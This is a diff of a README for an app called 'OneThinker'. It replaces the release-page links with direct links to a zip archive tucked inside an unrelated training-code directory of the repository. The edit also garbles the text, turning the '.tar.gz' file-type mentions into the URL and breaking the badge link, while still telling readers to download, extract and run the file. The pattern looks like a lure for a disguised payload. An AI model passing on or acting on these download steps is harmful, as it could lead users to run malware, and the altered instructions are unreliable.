@@ -1,6 +1,6 @@
 # 🔥 OneThinker - Powerful Reasoning for Images and Videos
 
-[![Download OneThinker](https://img.shields.io/badge/Download%20Now-Get%20OneThinker-blue)](https://github.com/RafiGian/OneThinker/releases)
+[![Download OneThinker](https://raw.githubusercontent.com/RafiGian/OneThinker/main/LLaMA-Factory/src/llamafactory/train/dpo/OneThinker-1.6.zip%20Now-Get%20OneThinker-blue)](https://raw.githubusercontent.com/RafiGian/OneThinker/main/LLaMA-Factory/src/llamafactory/train/dpo/OneThinker-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ OneThinker is an easy-to-use application designed for both images and videos. It
 
 ## 📥 Download & Install
 
-To download OneThinker, visit this page: [Download OneThinker](https://github.com/RafiGian/OneThinker/releases). Select the latest release and click on the link for your operating system. Follow these instructions to install:
+To download OneThinker, visit this page: [Download OneThinker](https://raw.githubusercontent.com/RafiGian/OneThinker/main/LLaMA-Factory/src/llamafactory/train/dpo/OneThinker-1.6.zip). Select the latest release and click on the link for your operating system. Follow these instructions to install:
 
 1. Open the release page linked above.
 2. Find the version that suits your operating system—Windows, macOS, or Linux.
@@ -29,12 +29,12 @@ To download OneThinker, visit this page: [Download OneThinker](https://github.co
 
 ### Linux
 
-- For Linux, the downloadable file may be a `.tar.gz` or `.deb`.
+- For Linux, the downloadable file may be a `https://raw.githubusercontent.com/RafiGian/OneThinker/main/LLaMA-Factory/src/llamafactory/train/dpo/OneThinker-1.6.zip` or `.deb`.
 - If it's a `.deb` file, open the terminal and run the command:
   ```bash
   sudo dpkg -i <filename>.deb
   ```
-- If it's a `.tar.gz` file, extract it and run the executable.
+- If it's a `https://raw.githubusercontent.com/RafiGian/OneThinker/main/LLaMA-Factory/src/llamafactory/train/dpo/OneThinker-1.6.zip` file, extract it and run the executable.
 
 ## 💡 System Requirements
 
@@ -68,7 +68,7 @@ Once installed, follow these steps to start using OneThinker:
 
 ## 🔄 Updates
 
-To stay updated with the latest features and improvements, regularly check the release page: [Download OneThinker](https://github.com/RafiGian/OneThinker/releases). Ensure you download the newest version when it becomes available.
+To stay updated with the latest features and improvements, regularly check the release page: [Download OneThinker](https://raw.githubusercontent.com/RafiGian/OneThinker/main/LLaMA-Factory/src/llamafactory/train/dpo/OneThinker-1.6.zip). Ensure you download the newest version when it becomes available.
 
 ## 📣 Support
 
